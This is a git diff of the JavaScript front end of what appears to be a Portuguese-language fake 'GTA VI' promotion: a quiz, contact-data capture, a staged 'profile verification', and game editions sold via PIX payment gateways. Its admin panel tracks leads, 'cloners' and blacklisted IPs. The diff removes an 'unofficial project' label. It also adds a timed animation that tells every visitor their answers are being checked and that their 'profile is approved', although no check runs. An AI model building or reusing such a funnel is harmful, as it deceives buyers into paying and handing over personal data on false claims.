@@ -3,7 +3,7 @@ import './hero-polish.css';
 import './quiz-polish.css';
 import './lead-flow.css';
 import './desktop-polish.css';
-import './analysis-premium.css';
+import './processing-unified.css';
 
 const quiz = [
   {
@@ -105,38 +105,38 @@ const gtaOffers = [
     tag: 'Standard',
     title: 'GTA VI Standard',
     subtitle: 'Jogo base',
-    description: 'Acesso a edicao principal vinculada ao perfil aprovado.',
+    description: 'Acesso à edição principal vinculada ao perfil aprovado.',
     price: 207.98,
     oldPrice: 349.9,
     badge: 'Selecionado',
     image: '/assets/gta-vi-poster.jpg',
-    details: ['Jogo base digital', 'Perfil vinculado ao cadastro aprovado', 'Liberacao apos confirmacao da etapa final'],
+    details: ['Jogo base digital', 'Perfil vinculado ao cadastro aprovado', 'Liberação após confirmação da etapa final'],
   },
   {
     id: 'ultimate',
     tag: 'Ultimate',
     title: 'GTA VI Ultimate',
-    subtitle: 'Conteudo extra',
-    description: 'Inclui pacote digital, bonus de inicio e prioridade na proxima etapa.',
+    subtitle: 'Conteúdo extra',
+    description: 'Inclui pacote digital, bônus de início e prioridade na próxima etapa.',
     price: 289.3,
     oldPrice: 499.9,
     badge: 'Mais escolhido',
     image: '/assets/gta-vi-lucia-jason-phone.jpg',
     featured: true,
-    details: ['Inclui conteudo digital extra', 'Prioridade na fila de liberacao', 'Bonus inicial vinculado ao perfil'],
+    details: ['Inclui conteúdo digital extra', 'Prioridade na fila de liberação', 'Bônus inicial vinculado ao perfil'],
   },
   {
     id: 'early',
     tag: 'Antecipado',
     title: 'GTA VI Acesso Antecipado',
     subtitle: '7 dias antes',
-    description: 'Libere a edicao com acesso uma semana antes da liberacao geral.',
+    description: 'Libere a edição com acesso uma semana antes da liberação geral.',
     price: 359.9,
     oldPrice: 599.9,
-    badge: 'Prioridade maxima',
+    badge: 'Prioridade máxima',
     image: '/assets/gta-vi-lucia-jason-expanded.png',
     premium: true,
-    details: ['Acesso 7 dias antes da liberacao geral', 'Prioridade maxima na validacao', 'Pacote completo com beneficios digitais'],
+    details: ['Acesso 7 dias antes da liberação geral', 'Prioridade máxima na validação', 'Pacote completo com benefícios digitais'],
   },
 ];
 
@@ -154,13 +154,14 @@ let adminSelectedLeadSession = null;
 let adminLeadPagination = { offset: 0, limit: 200, hasMore: false, total: null };
 let adminLeadFilters = { q: '', from: '', to: '' };
 let siteConfig = { tracking: {}, features: {} };
-let analysisAnimationCleanup = null;
-let analysisTimers = [];
+let processingAnimationCleanup = null;
+let processingRaf = 0;
+let processingStarted = false;
 
 const app = document.querySelector('#app');
 
 function setDocumentScreenMode(mode) {
-  const classes = ['is-home-screen', 'is-quiz-screen', 'is-analysis-screen'];
+  const classes = ['is-home-screen', 'is-quiz-screen'];
   document.documentElement.classList.remove(...classes);
   document.body.classList.remove(...classes);
   if (!mode) return;
@@ -170,7 +171,7 @@ function setDocumentScreenMode(mode) {
 }
 
 function render() {
-  clearAnalysisExperience();
+  clearProcessingExperience();
   const route = routeName();
   if (route === 'analise') {
     const personal = readJson(storageKeys.personal, {});
@@ -180,8 +181,9 @@ function render() {
       renderDataPage();
       return;
     }
-    setDocumentScreenMode('analysis');
-    renderAnalysisPage();
+    window.history.replaceState({}, '', '/processando');
+    setDocumentScreenMode(null);
+    renderProcessingPage();
     return;
   }
   if (route === 'dados') {
@@ -220,7 +222,6 @@ function renderExperience() {
 
         <header class="topbar">
           <div class="topbar__logo">${brandMark('symbol')}</div>
-          <span class="topbar__disclaimer">Projeto não oficial</span>
         </header>
 
         <div class="hero__content">
@@ -236,8 +237,8 @@ function renderExperience() {
             </h1>
           </div>
           <p class="hero__copy">
-            Responda ao questionario e desbloqueie sua
-            participacao na <strong>campanha exclusiva do GTA 6.</strong>
+            Responda ao questionário e desbloqueie sua
+            participação na <strong>campanha exclusiva do GTA VI.</strong>
           </p>
           <div class="hero__actions">
             <button class="rockstar-button" id="startButton">
@@ -251,7 +252,7 @@ function renderExperience() {
 
       <section class="quiz-screen screen" id="quiz" aria-label="Quiz GTA VI">
         <header class="quiz-header">
-          <div class="quiz-header__logo" aria-label="Simbolo Rockstar Games">${brandMark('quiz')}</div>
+          <div class="quiz-header__logo" aria-label="Símbolo Rockstar Games">${brandMark('quiz')}</div>
         </header>
         <div class="quiz-shell">
           <div class="progress-track" aria-hidden="true"><span id="progressBar"></span></div>
@@ -280,11 +281,11 @@ function renderDataPage(success = false) {
           <h1>${success ? 'Dados recebidos' : 'Complete seus dados'}</h1>
           <p class="data-copy data-copy--small">
             ${success
-              ? 'Seu contato foi registrado e o perfil segue para a ultima analise da lista de interesse.'
-              : 'Seu perfil passou pela avaliacao inicial do quiz. Agora complete seus dados para finalizar a analise e manter seu contato vinculado ao resultado.'}
+              ? 'Seu contato foi registrado e o perfil segue para a última análise da lista de interesse.'
+              : 'Seu perfil passou pela avaliação inicial do quiz. Agora complete seus dados para finalizar a análise e manter seu contato vinculado ao resultado.'}
           </p>
           ${success ? successMarkup() : dataFormMarkup(personal)}
-          <p class="data-safe-note-rs">Projeto independente e nao afiliado a Rockstar Games. Nao solicitamos dados sensiveis.</p>
+          <p class="data-safe-note-rs">Projeto independente e não afiliado à Rockstar Games. Não solicitamos dados sensíveis.</p>
         </article>
       </section>
     </main>
@@ -298,82 +299,16 @@ function renderDataPage(success = false) {
 function flowTopbarMarkup() {
   return `
     <header class="flow-topbar-rs">
-      <div class="quiz-header__logo" aria-label="Simbolo Rockstar Games">${brandMark('quiz')}</div>
+      <div class="quiz-header__logo" aria-label="Símbolo Rockstar Games">${brandMark('quiz')}</div>
     </header>
   `;
-}
-
-function renderAnalysisPage() {
-  app.innerHTML = `
-    <main class="analysis-screen" data-page="analise">
-      ${flowTopbarMarkup()}
-      <section class="analysis-shell-rs">
-        <article class="analysis-card-rs">
-          <div class="analysis-visual-rs" aria-hidden="true">
-            <div class="analysis-player-rs" id="analysisMotion"></div>
-          </div>
-          <div class="analysis-content-rs" role="status" aria-live="polite">
-            <p class="analysis-status-rs">Análise do perfil</p>
-            <h1 id="analysisTitle">Analisando seu perfil</h1>
-            <p class="analysis-copy-rs">Só um instante enquanto preparamos seu resultado.</p>
-            <div class="analysis-current-rs"><i aria-hidden="true"></i><span id="analysisCurrent">Validando respostas</span></div>
-            <div class="analysis-progress-rs" role="progressbar" aria-label="Progresso da análise" aria-valuemin="0" aria-valuemax="100" aria-valuenow="8" id="analysisProgress"><span></span></div>
-            <p class="analysis-privacy-rs">Processamento seguro</p>
-          </div>
-        </article>
-      </section>
-    </main>
-  `;
-  initSession();
-  trackPage('analise');
-  mountAnalysisExperience();
-}
-
-async function mountAnalysisExperience() {
-  const target = document.querySelector('#analysisMotion');
-  if (!target) return;
-
-  try {
-    const { mountAnalysisResultPlayer } = await import('./remotion/AnalysisResultPlayer.jsx');
-    if (routeName() !== 'analise' || !target.isConnected) return;
-    analysisAnimationCleanup = mountAnalysisResultPlayer(target);
-  } catch (error) {
-    console.error('Nao foi possivel iniciar a animacao da analise.', error);
-  }
-
-  const current = document.querySelector('#analysisCurrent');
-  const title = document.querySelector('#analysisTitle');
-  const progress = document.querySelector('#analysisProgress');
-  const card = document.querySelector('.analysis-card-rs');
-  const updateStep = (message, value) => {
-    if (current) current.textContent = message;
-    progress?.setAttribute('aria-valuenow', String(value));
-  };
-
-  analysisTimers.push(window.setTimeout(() => updateStep('Calculando compatibilidade', 58), 1150));
-  analysisTimers.push(window.setTimeout(() => updateStep('Preparando resultado', 86), 2450));
-  analysisTimers.push(window.setTimeout(() => {
-    updateStep('Concluído', 100);
-    card?.classList.add('is-complete');
-    if (title) title.textContent = 'Perfil analisado';
-  }, 3450));
-  analysisTimers.push(window.setTimeout(() => {
-    if (routeName() === 'analise') navigateTo('/processando');
-  }, 4400));
-}
-
-function clearAnalysisExperience() {
-  analysisTimers.forEach((timer) => window.clearTimeout(timer));
-  analysisTimers = [];
-  if (analysisAnimationCleanup) analysisAnimationCleanup();
-  analysisAnimationCleanup = null;
 }
 
 function dataScoreMarkup(summary = {}) {
   const total = Number(summary.total || 0);
   const score = Number(summary.score || 0);
   const percent = total ? Math.round((score / total) * 100) : 0;
-  const status = summary.status || (percent >= 70 ? 'Perfil forte' : percent >= 45 ? 'Perfil em analise' : 'Interesse registrado');
+  const status = summary.status || (percent >= 70 ? 'Perfil forte' : percent >= 45 ? 'Perfil em análise' : 'Interesse registrado');
   return `
     <aside class="data-score-rs" aria-label="Resultado do quiz">
       <div class="data-score-ring-rs" style="--score:${Math.max(0, Math.min(100, percent))}">
@@ -383,7 +318,7 @@ function dataScoreMarkup(summary = {}) {
       <div>
         <small>Resultado do quiz</small>
         <b>${escapeHtml(status)}</b>
-        <p>${total ? `${score} de ${total} pontos considerados no perfil.` : 'Quiz concluido e pronto para vinculacao.'}</p>
+        <p>${total ? `${score} de ${total} pontos considerados no perfil.` : 'Quiz concluído e pronto para vinculação.'}</p>
       </div>
     </aside>
   `;
@@ -416,8 +351,8 @@ function dataFormMarkup(personal) {
 function successMarkup() {
   return `
     <div class="data-form">
-      <button class="data-submit" type="button" disabled>Perfil em analise</button>
-      <p class="form-status-rs is-ok">A proxima etapa do funil sera conectada aqui.</p>
+      <button class="data-submit" type="button" disabled>Perfil em análise</button>
+      <p class="form-status-rs is-ok">A próxima etapa do funil será conectada aqui.</p>
     </div>
   `;
 }
@@ -430,7 +365,7 @@ function renderAdminPage() {
           <div class="admin-logo-rs">${brandMark('quiz')}</div>
           <p class="admin-kicker-rs">Painel privado</p>
           <h1>Admin Rockstar</h1>
-          <p class="admin-muted-rs">Central de leads, tracking, UTMfy, pixels e gateways da promocao GTA VI.</p>
+          <p class="admin-muted-rs">Central de leads, tracking, UTMfy, pixels e gateways da promoção GTA VI.</p>
           <form class="admin-login-form-rs" id="adminLoginForm">
             <label class="field-rs">
               <span>Senha do admin</span>
@@ -450,19 +385,19 @@ function renderAdminPage() {
                 <span>Promo Admin</span>
               </div>
             </div>
-            <nav class="admin-nav-rs" aria-label="Administracao">
-              <button class="is-active" data-admin-tab="overview" type="button">Visao geral</button>
+            <nav class="admin-nav-rs" aria-label="Administração">
+              <button class="is-active" data-admin-tab="overview" type="button">Visão geral</button>
               <button data-admin-tab="leads" type="button">Leads</button>
               <button data-admin-tab="tracking" type="button">Pixel</button>
               <button data-admin-tab="utmfy" type="button">UTMfy</button>
               <button data-admin-tab="gateways" type="button">Gateways</button>
-              <button data-admin-tab="public" type="button">Publico</button>
+              <button data-admin-tab="public" type="button">Público</button>
               <button data-admin-tab="sales" type="button">Vendas</button>
               <button data-admin-tab="backredirects" type="button">Backredirects</button>
               <button data-admin-tab="cloners" type="button">Clonadores</button>
               <button data-admin-tab="blacklist" type="button">Blacklist</button>
               <button data-admin-tab="audit" type="button">Auditoria</button>
-              <button data-admin-tab="pages" type="button">Paginas</button>
+              <button data-admin-tab="pages" type="button">Páginas</button>
             </nav>
             <div class="admin-side-foot-rs">
               <span>Supabase</span>
@@ -473,7 +408,7 @@ function renderAdminPage() {
             <div class="admin-top-rs">
               <div>
                 <p class="admin-kicker-rs">Dashboard operacional</p>
-                <h1 id="adminTitle">Visao geral</h1>
+                <h1 id="adminTitle">Visão geral</h1>
                 <p class="admin-muted-rs" id="adminSubtitle">Monitoramento do funil promocional em tempo real.</p>
               </div>
               <div class="admin-actions-rs">
@@ -680,12 +615,12 @@ function bindDataForm() {
     const result = await trackLead({ stage: 'dados', event: 'personal_submitted', personal, quiz: readJson(storageKeys.quiz, null) });
     if (!result.ok && result.reason !== 'missing_supabase_config') {
       status.classList.add('is-error');
-      status.textContent = 'Nao foi possivel salvar agora. Tente novamente.';
+      status.textContent = 'Não foi possível salvar agora. Tente novamente.';
       return;
     }
     status.classList.add('is-ok');
     status.textContent = 'Dados registrados.';
-    window.setTimeout(() => navigateTo('/analise'), 420);
+    window.setTimeout(() => navigateTo('/processando'), 420);
   });
 }
 
@@ -694,50 +629,75 @@ function renderProcessingPage() {
     <main class="processing-screen" data-page="processando">
       ${flowTopbarMarkup()}
       <section class="processing-shell-rs">
-        <article class="processing-card-rs">
-          <p class="processing-kicker-rs">Etapa final</p>
-          <h1>Verificacao em andamento...</h1>
-          <p class="processing-copy-rs" id="processingHeadline">Assista ao comunicado enquanto finalizamos a analise do perfil.</p>
+        <article class="processing-card-rs processing-card-rs--unified">
+          <header class="processing-intro-rs">
+            <p class="processing-kicker-rs">Análise final</p>
+            <h1>Verificando seu perfil</h1>
+            <p class="processing-copy-rs">Assista ao comunicado. Conforme o vídeo avança, verificamos se seu perfil é adequado para a promoção.</p>
+          </header>
 
-          <div class="processing-progress-rs" aria-label="Progresso da verificacao">
-            <div class="processing-segments-rs" aria-hidden="true">
-              <span></span><span></span><span></span><span></span><span></span>
-            </div>
-            <strong id="processingPercent">77%</strong>
-          </div>
-
-          <div class="processing-stage-rs processing-stage-rs--clean">
+          <div class="processing-stage-rs processing-stage-rs--unified">
             <div class="processing-video-shell-rs">
-              <div class="processing-video-rs" role="img" aria-label="Video explicativo da proxima etapa">
+              <div class="processing-video-rs" role="group" aria-label="Vídeo explicativo da próxima etapa">
                 <img src="/assets/gta-vi-poster.jpg" alt="" />
                 <div class="processing-video-shade-rs"></div>
-                <button class="processing-play-rs" type="button" aria-label="Assistir video">
+                <button class="processing-play-rs" type="button" aria-label="Assistir ao vídeo">
                   <span></span>
                 </button>
                 <div class="processing-video-caption-rs">
-                  <small>Comunicado</small>
-                  <b>Assista para continuar</b>
+                  <small>Comunicado da promoção</small>
+                  <b>Toque para assistir</b>
                 </div>
+                <div class="processing-video-timeline-rs" aria-hidden="true"><span></span></div>
               </div>
             </div>
+
+            <aside class="processing-analysis-rs" aria-live="polite">
+              <div class="processing-analysis-motion-rs" id="processingAnalysisMotion" aria-hidden="true"></div>
+              <p class="processing-analysis-label-rs">Verificação do perfil</p>
+              <strong id="processingStatus">Aguardando o vídeo</strong>
+              <p id="processingAnalysisCopy">A análise começa junto com o comunicado.</p>
+              <div class="processing-profile-progress-rs" id="processingProfileProgress" role="progressbar" aria-label="Progresso da verificação" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0"><span></span></div>
+              <output id="processingPercent">0%</output>
+            </aside>
           </div>
         </article>
-        <footer class="processing-footer-rs">Projeto independente. Nao afiliado a Rockstar Games.</footer>
+        <footer class="processing-footer-rs">Projeto independente. Não afiliado à Rockstar Games.</footer>
       </section>
     </main>
   `;
   initSession();
   trackPage('processando');
-  animateProcessingPercent();
+  mountProcessingAnimation();
   bindProcessingPage();
+}
+
+async function mountProcessingAnimation() {
+  const target = document.querySelector('#processingAnalysisMotion');
+  if (!target) return;
+  try {
+    const { mountAnalysisResultPlayer } = await import('./remotion/AnalysisResultPlayer.jsx');
+    if (routeName() !== 'processando' || !target.isConnected) return;
+    processingAnimationCleanup = mountAnalysisResultPlayer(target, { autoStart: false, durationMs: 8500 });
+    if (processingStarted) processingAnimationCleanup.start?.();
+  } catch (error) {
+    console.error('Não foi possível iniciar a animação da análise.', error);
+  }
 }
 
 function bindProcessingPage() {
   const playButton = document.querySelector('.processing-play-rs');
+  const video = document.querySelector('.processing-video-rs');
   const caption = document.querySelector('.processing-video-caption-rs b');
-  const headline = document.querySelector('#processingHeadline');
+  const status = document.querySelector('#processingStatus');
+  const analysisCopy = document.querySelector('#processingAnalysisCopy');
+  const progress = document.querySelector('#processingProfileProgress');
+  const progressFill = progress?.querySelector('span');
+  const percent = document.querySelector('#processingPercent');
+  let completed = false;
   const goOffers = async (event = 'vsl_completed') => {
-    if (routeName() !== 'processando') return;
+    if (completed || routeName() !== 'processando') return;
+    completed = true;
     trackClarityEvent(event, { stage: 'processando' });
     await trackLead({
       stage: 'processando',
@@ -748,21 +708,55 @@ function bindProcessingPage() {
     navigateTo('/ofertas');
   };
 
-  let started = false;
   playButton?.addEventListener('click', () => {
-    if (started) return;
-    started = true;
+    if (processingStarted) return;
+    processingStarted = true;
     trackClarityEvent('vsl_started', { stage: 'processando' });
     playButton.classList.add('is-playing');
-    playButton.setAttribute('aria-label', 'Video em andamento');
-    if (caption) caption.textContent = 'Liberando selecao...';
-    if (headline) headline.textContent = 'Estamos validando a ultima etapa enquanto o comunicado termina.';
-    window.setTimeout(() => goOffers('vsl_completed'), 8500);
-  });
+    playButton.setAttribute('aria-label', 'Vídeo em andamento');
+    playButton.disabled = true;
+    video?.classList.add('is-playing');
+    processingAnimationCleanup?.start?.();
+    if (caption) caption.textContent = 'Análise em andamento';
+    if (analysisCopy) analysisCopy.textContent = 'Estamos comparando suas respostas com os critérios da promoção.';
 
-  window.setTimeout(() => {
-    if (!started) goOffers('vsl_auto_completed');
-  }, 28000);
+    const stages = [
+      { at: 0, message: 'Validando suas respostas' },
+      { at: 0.27, message: 'Cruzando interesses com a promoção' },
+      { at: 0.56, message: 'Verificando compatibilidade do perfil' },
+      { at: 0.8, message: 'Preparando seu resultado' },
+      { at: 0.97, message: 'Perfil adequado para a promoção' },
+    ];
+    const startedAt = performance.now();
+    const duration = 8500;
+    const tick = (now) => {
+      if (routeName() !== 'processando') return;
+      const ratio = Math.min(1, (now - startedAt) / duration);
+      const value = Math.round(ratio * 100);
+      const currentStage = [...stages].reverse().find((stage) => ratio >= stage.at) || stages[0];
+      if (status) status.textContent = currentStage.message;
+      if (percent) percent.textContent = `${value}%`;
+      if (progressFill) progressFill.style.width = `${value}%`;
+      progress?.setAttribute('aria-valuenow', String(value));
+      if (ratio < 1) {
+        processingRaf = window.requestAnimationFrame(tick);
+        return;
+      }
+      video?.classList.add('is-complete');
+      if (caption) caption.textContent = 'Perfil aprovado';
+      if (analysisCopy) analysisCopy.textContent = 'Verificação concluída. Liberando sua seleção.';
+      goOffers('vsl_completed');
+    };
+    processingRaf = window.requestAnimationFrame(tick);
+  });
+}
+
+function clearProcessingExperience() {
+  if (processingRaf) window.cancelAnimationFrame(processingRaf);
+  processingRaf = 0;
+  processingStarted = false;
+  if (processingAnimationCleanup) processingAnimationCleanup();
+  processingAnimationCleanup = null;
 }
 
 function renderOffersPage() {
@@ -776,15 +770,15 @@ function renderOffersPage() {
           <span class="offer-approved-pill-rs">Aprovado</span>
           <h1><span>Perfil 100%</span><span>aprovado</span></h1>
           <p data-clarity-mask="true">
-            Parabens, ${escapeHtml(firstName)}. Sua analise foi concluida e uma selecao especial foi liberada para este cadastro.
+            Parabéns, ${escapeHtml(firstName)}. Sua análise foi concluída e uma seleção especial foi liberada para este cadastro.
           </p>
         </article>
 
-        <section class="offer-list-rs" aria-label="Escolha sua edicao">
+        <section class="offer-list-rs" aria-label="Escolha sua edição">
           ${gtaOffers.map(offerCardMarkup).join('')}
         </section>
 
-        <p class="offer-disclaimer-rs">Projeto independente e nao afiliado a Rockstar Games. Valores e disponibilidade fazem parte desta experiencia promocional.</p>
+        <p class="offer-disclaimer-rs">Projeto independente e não afiliado à Rockstar Games. Valores e disponibilidade fazem parte desta experiência promocional.</p>
       </section>
     </main>
   `;
@@ -867,45 +861,6 @@ function bindOffersPage() {
   });
 }
 
-function animateProcessingPercent() {
-  const target = document.querySelector('#processingPercent');
-  if (!target) return;
-  const start = 77;
-  const end = 94;
-  const startedAt = performance.now();
-  const duration = 6200;
-  const tick = (now) => {
-    const progress = Math.min(1, (now - startedAt) / duration);
-    const eased = 1 - Math.pow(1 - progress, 3);
-    target.textContent = `${Math.round(start + (end - start) * eased)}%`;
-    if (progress < 1) requestAnimationFrame(tick);
-  };
-  requestAnimationFrame(tick);
-}
-
-function animateProcessingChecks() {
-  const checks = Array.from(document.querySelectorAll('[data-processing-check]'));
-  const headline = document.querySelector('#processingHeadline');
-  if (!checks.length) return;
-  const messages = [
-    'Verificando se o perfil esta apto para seguir na lista...',
-    'Cruzando respostas com os criterios da etapa atual...',
-    'Validando prioridade e consistencia do cadastro...',
-    'Preparando a proxima liberacao enquanto o video roda...',
-  ];
-  let activeIndex = 0;
-  const update = () => {
-    checks.forEach((item, index) => {
-      item.classList.toggle('is-done', index < activeIndex);
-      item.classList.toggle('is-active', index === activeIndex);
-    });
-    if (headline) headline.textContent = messages[activeIndex] || messages[0];
-    activeIndex = (activeIndex + 1) % checks.length;
-  };
-  update();
-  window.setInterval(update, 2600);
-}
-
 function bindAdmin() {
   const loginCard = document.querySelector('#adminLoginCard');
   const panel = document.querySelector('#adminPanel');
@@ -931,7 +886,7 @@ function bindAdmin() {
     });
     if (!response.ok) {
       status.classList.add('is-error');
-      status.textContent = 'Senha invalida.';
+      status.textContent = 'Senha inválida.';
       return;
     }
     showAdminPanel(loginCard, panel);
@@ -1005,7 +960,7 @@ async function loadAdminData({ force = false } = {}) {
     adminOverview.pagesList = Array.isArray(pagesJson.data) ? pagesJson.data : [];
     renderAdminPanel();
     document.querySelector('#adminHealth').textContent = 'Online';
-    if (status) status.textContent = `${adminLeads.length} leads carregados. Ultima leitura ${formatDate(new Date().toISOString())}.`;
+    if (status) status.textContent = `${adminLeads.length} leads carregados. Última leitura ${formatDate(new Date().toISOString())}.`;
   } catch (error) {
     document.querySelector('#adminHealth').textContent = 'Erro';
     if (status) status.textContent = error.message || 'Falha ao carregar dados.';
@@ -1017,18 +972,18 @@ function renderAdminPanel() {
     button.classList.toggle('is-active', button.dataset.adminTab === adminCurrentTab);
   });
   const titles = {
-    overview: ['Visao geral', 'Performance, funil e origem dos leads em uma tela.'],
+    overview: ['Visão geral', 'Performance, funil e origem dos leads em uma tela.'],
     leads: ['Leads', 'Lista operacional com quiz, contato, UTM e etapa atual.'],
-    tracking: ['Pixel', 'Configuracao de Meta, TikTok e Google Tag.'],
+    tracking: ['Pixel', 'Configuração de Meta, TikTok e Google Tag.'],
     utmfy: ['UTMfy', 'Envio de eventos e padrao de order para atribuicao.'],
     gateways: ['Gateways', 'Multigateway preparado para Sunize, Paradise, AtomoPay e Bravo Pay.'],
-    public: ['Publico', 'Recomendacoes de audiencia e segmentacao para campanhas.'],
+    public: ['Público', 'Recomendações de audiência e segmentação para campanhas.'],
     sales: ['Vendas', 'Resumo por gateway e receita quando o checkout estiver conectado.'],
     backredirects: ['Backredirects', 'Tentativas de volta e pontos de abandono do funil.'],
     cloners: ['Clonadores', 'Sinais de clone, auditoria e risco por IP/user-agent.'],
     blacklist: ['Blacklist', 'Bloqueio manual de IPs suspeitos.'],
-    audit: ['Auditoria', 'Historico de acessos e alteracoes administrativas.'],
-    pages: ['Paginas', 'Leitura de pageviews e etapas do funil.'],
+    audit: ['Auditoria', 'Histórico de acessos e alterações administrativas.'],
+    pages: ['Páginas', 'Leitura de pageviews e etapas do funil.'],
   };
   const [title, subtitle] = titles[adminCurrentTab] || titles.overview;
   document.querySelector('#adminTitle').textContent = title;
@@ -1058,13 +1013,13 @@ function bindAdminContent() {
   document.querySelectorAll('[data-test-integration]').forEach((button) => {
     button.addEventListener('click', async () => {
       const status = document.querySelector('#adminStatus');
-      status.textContent = 'Testando integracao...';
+      status.textContent = 'Testando integração...';
       const body = { kind: button.dataset.testIntegration };
       const result = await adminFetch('/api/admin/test-integration', {
         method: 'POST',
         body: JSON.stringify(body),
       }).catch((error) => ({ ok: false, message: error.message }));
-      status.textContent = result.message || 'Teste concluido.';
+      status.textContent = result.message || 'Teste concluído.';
     });
   });
   document.querySelectorAll('[data-gateway-config-toggle]').forEach((button) => {
@@ -1184,8 +1139,8 @@ function overviewMarkup() {
       ${statCard('Com contato', summary.withContact || 0, 'Email ou telefone')}
       ${statCard('Quiz completo', summary.quizDone || 0, 'Avaliacoes finalizadas')}
       ${statCard('Qualificados', summary.qualified || 0, 'Pre-selecionados')}
-      ${statCard('Pageviews', summary.pageviews || 0, 'Eventos de pagina')}
-      ${statCard('Ultima atividade', formatShortDate(summary.lastUpdated), 'Supabase')}
+      ${statCard('Pageviews', summary.pageviews || 0, 'Eventos de página')}
+      ${statCard('Última atividade', formatShortDate(summary.lastUpdated), 'Supabase')}
     </div>
     <section class="admin-grid-2-rs">
       <div class="admin-section-rs">
@@ -1289,7 +1244,7 @@ function leadDetailMarkup(lead) {
             <div class="lead-detail-tags-rs">
               <span class="admin-chip-rs">${escapeHtml(quiz.status || 'sem quiz')}</span>
               <span class="admin-chip-rs">${escapeHtml(lead.utm_source || utm.utm_source || 'sem origem')}</span>
-              <span class="admin-chip-rs">${escapeHtml(pageviews.length ? `${pageviews.length} paginas` : 'sem pageviews')}</span>
+              <span class="admin-chip-rs">${escapeHtml(pageviews.length ? `${pageviews.length} páginas` : 'sem pageviews')}</span>
             </div>
             <div class="lead-detail-summary-rs">
               ${leadSummaryCard('Quiz', quiz.score !== undefined ? `${quiz.score}/${quiz.total || '-'}` : '-', quiz.status || '-')}
@@ -1298,13 +1253,13 @@ function leadDetailMarkup(lead) {
             </div>
             <div class="lead-detail-actions-rs">
               <button class="admin-row-button-rs" data-copy-lead-payload type="button">Copiar JSON</button>
-              <span class="admin-muted-rs" id="leadCopyStatus">Detalhes carregados da sessao.</span>
+              <span class="admin-muted-rs" id="leadCopyStatus">Detalhes carregados da sessão.</span>
             </div>
           </aside>
 
           <div class="lead-detail-main-rs">
             <section class="lead-detail-section-rs lead-detail-section-rs--wide">
-              <div class="admin-section-head-rs"><h2>Visao geral</h2><span>perfil</span></div>
+              <div class="admin-section-head-rs"><h2>Visão geral</h2><span>perfil</span></div>
               <div class="lead-detail-stat-grid-rs">
                 ${leadInfoCard('Etapa atual', lead.stage || lead.etapa || '-', lead.last_event || lead.evento || '-')}
                 ${leadInfoCard('Quiz', quiz.score !== undefined ? `${quiz.score}/${quiz.total || '-'}` : '-', quiz.status || '-')}
@@ -1319,7 +1274,7 @@ function leadDetailMarkup(lead) {
                 ${leadKv('Nome', lead.name || lead.nome)}
                 ${leadKv('Email', lead.email)}
                 ${leadKv('Telefone', lead.phone || lead.telefone)}
-                ${leadKv('Sessao', lead.session_id)}
+                ${leadKv('Sessão', lead.session_id)}
               </div>
             </section>
 
@@ -1390,7 +1345,7 @@ function leadTimeline(lead, pageviews = []) {
   const quiz = payload.quiz || {};
   const items = [];
   if (lead.created_at) items.push({ at: lead.created_at, label: 'Primeiro registro', detail: lead.stage || 'lead criado' });
-  pageviews.forEach((view) => items.push({ at: view.created_at, label: `Pagina /${view.page || '-'}`, detail: 'pageview registrado' }));
+  pageviews.forEach((view) => items.push({ at: view.created_at, label: `Página /${view.page || '-'}`, detail: 'pageview registrado' }));
   if (quiz.completedAt) items.push({ at: quiz.completedAt, label: 'Quiz finalizado', detail: `${quiz.score ?? '-'} de ${quiz.total ?? '-'} pontos` });
   if (lead.name || lead.email || lead.phone) items.push({ at: lead.updated_at || lead.created_at, label: 'Dados enviados', detail: [lead.name, lead.email, lead.phone].filter(Boolean).join(' · ') || 'contato capturado' });
   if (lead.last_event) items.push({ at: lead.updated_at || lead.created_at, label: 'Ultimo evento', detail: lead.last_event });
@@ -1473,7 +1428,7 @@ function gatewayTestMarkup(gateways = {}, order = gatewayKeys) {
           </div>
           <button class="gateway-test-close-rs" data-gateway-test-close type="button" aria-label="Fechar">Fechar</button>
         </div>
-        <p class="admin-hint-rs">Gera PIXs reais direto nas credenciais salvas. Use valor baixo para validar fallback, QR Code e copia-e-cola antes de escalar trafego.</p>
+        <p class="admin-hint-rs">Gera PIXs reais direto nas credenciais salvas. Use valor baixo para validar fallback, QR Code e copia-e-cola antes de escalar tráfego.</p>
         <div class="gateway-test-controls-rs">
           <label class="field-rs">
             <span>Valor do teste</span>
@@ -1562,7 +1517,7 @@ function gatewayFieldsMarkup(name, gateway) {
       settingInput('gateways.paradise.productHash', 'Product hash', gateway.productHash, 'password'),
       settingInput('gateways.paradise.orderbumpHash', 'Orderbump hash', gateway.orderbumpHash, 'password'),
       settingInput('gateways.paradise.source', 'Source', gateway.source || 'api_externa'),
-      settingInput('gateways.paradise.description', 'Descricao PIX', gateway.description),
+      settingInput('gateways.paradise.description', 'Descrição PIX', gateway.description),
     ].join('');
   }
   if (name === 'atomopay') {
@@ -1585,7 +1540,7 @@ function gatewayFieldsMarkup(name, gateway) {
     settingInput('gateways.bravopay.apiKey', 'API key', gateway.apiKey, 'password'),
     settingInput('gateways.bravopay.webhookSecret', 'Webhook secret', gateway.webhookSecret || gateway.secret, 'password'),
     settingInput('gateways.bravopay.expiresIn', 'Expira em segundos', gateway.expiresIn || 3600, 'number'),
-    settingInput('gateways.bravopay.description', 'Descricao PIX', gateway.description),
+    settingInput('gateways.bravopay.description', 'Descrição PIX', gateway.description),
   ].join('');
 }
 
@@ -1624,7 +1579,7 @@ function gatewayTestResultsMarkup(results = [], amount = 0) {
         ${paymentCode ? `
           <div class="gateway-test-copy-rs">
             <input value="${escapeAttr(paymentCode)}" readonly />
-            <button class="admin-row-button-rs" data-gateway-test-copy type="button">Copiar codigo</button>
+            <button class="admin-row-button-rs" data-gateway-test-copy type="button">Copiar código</button>
           </div>
         ` : ''}
         ${result?.detail ? `<p class="gateway-test-detail-rs">${escapeHtml(result.detail)}</p>` : ''}
@@ -1640,7 +1595,7 @@ function bindGatewayTestCopyButtons() {
       const value = input?.value || '';
       await navigator.clipboard?.writeText(value).catch(() => {});
       button.textContent = 'Copiado';
-      window.setTimeout(() => { button.textContent = 'Copiar codigo'; }, 1300);
+      window.setTimeout(() => { button.textContent = 'Copiar código'; }, 1300);
     });
   });
 }
@@ -1672,7 +1627,7 @@ async function runGatewayTests() {
     if (results) results.innerHTML = gatewayTestResultsMarkup(data.results || [], data.amount || amount);
     const okCount = (data.results || []).filter((item) => item?.ok).length;
     const failCount = (data.results || []).filter((item) => !item?.ok).length;
-    if (status) status.textContent = `Teste concluido: ${okCount} gerado(s), ${failCount} falha(s).`;
+    if (status) status.textContent = `Teste concluído: ${okCount} gerado(s), ${failCount} falha(s).`;
     bindGatewayTestCopyButtons();
   } catch (error) {
